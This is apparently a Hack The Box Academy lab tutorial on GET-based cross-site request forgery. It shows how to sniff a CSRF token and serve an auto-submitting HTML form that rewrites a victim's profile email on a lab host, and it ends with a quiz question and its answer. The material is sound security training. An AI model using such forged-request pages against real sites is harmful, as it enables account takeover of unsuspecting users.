# Cross-Site Request Forgery (GET-based)

Similar to how we can extract session cookies from applications that do not utilize SSL encryption, we can do the same regarding CSRF tokens included in unencrypted requests.

Let us see an example.

Proceed to the end of this section and click on `Click here to spawn the target system!` or the `Reset Target` icon, then use the provided Pwnbox or a local VM with the supplied VPN key to be able to reach the target application and follow along. Then, configure the specified vhost (`csrf.htb.net`) to access the application.

Navigate to `http://csrf.htb.net` and log in to the application using the credentials below:

* Email: heavycat106
* Password: rocknrol

This is an account that we created to look at the application's functionality.

Now, browse Julie Rogers' profile and click _Save_. You should see the below. ![image](https://academy.hackthebox.com/storage/modules/153/32.png)

Activate burp suite's proxy (_Intercept On_) and configure your browser to go through it. Now click _Save_ again.

You should see the below.

![image](https://academy.hackthebox.com/storage/modules/153/31.png)

The CSRF token is included in the GET request.

Let us simulate an attacker on the local network that sniffed the abovementioned request and wants to deface Julie Rogers' profile through a CSRF attack. Of course, they could have just performed a session hijacking attack using the sniffed session cookie.

First, create and serve the below HTML page. Save it as `notmalicious_get.html`

Code: html

```html
<html>
  <body>
    <form id="submitMe" action="http://csrf.htb.net/app/save/julie.rogers@example.com" method="GET">
      <input type="hidden" name="email" value="attacker@htb.net" />
      <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
      <input type="hidden" name="country" value="CSRF_POC" />
      <input type="hidden" name="action" value="save" />
      <input type="hidden" name="csrf" value="30e7912d04c957022a6d3072be8ef67e52eda8f2" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.getElementById("submitMe").submit()
    </script>
  </body>
</html>
```

Notice that the CSRF token's value above is the same as the CSRF token's value in the captured/"sniffed" request.

If you are wondering how we came up with the above form based on the intercepted GET request, please study the following resource [Sending form data](https://developer.mozilla.org/en-US/docs/Learn/Forms/Sending\_and\_retrieving\_form\_data)

You can serve the page above from your attacking machine as follows.

Cross-Site Request Forgery (GET-based)

```shell-session
AIceBear@htb[/htb]$ python -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
```

While still logged in as Julie Rogers, open a new tab and visit the page you are serving from your attacking machine `http://<VPN/TUN Adapter IP>:1337/notmalicious_get.html`. You will notice that Julie Rogers' profile details will change to the ones we specified in the HTML page you are serving.

![image](https://academy.hackthebox.com/storage/modules/153/34.png)

In the next section, we will attack an application submitting the CSRF token via POST without having to reside in the local network.

**Questions**

If csrf.htb.net was utilizing SSL encryption, would an attacker still be able to alter Julie Rogers' profile through CSRF? Answer format: Yes or No

```
Yes
```
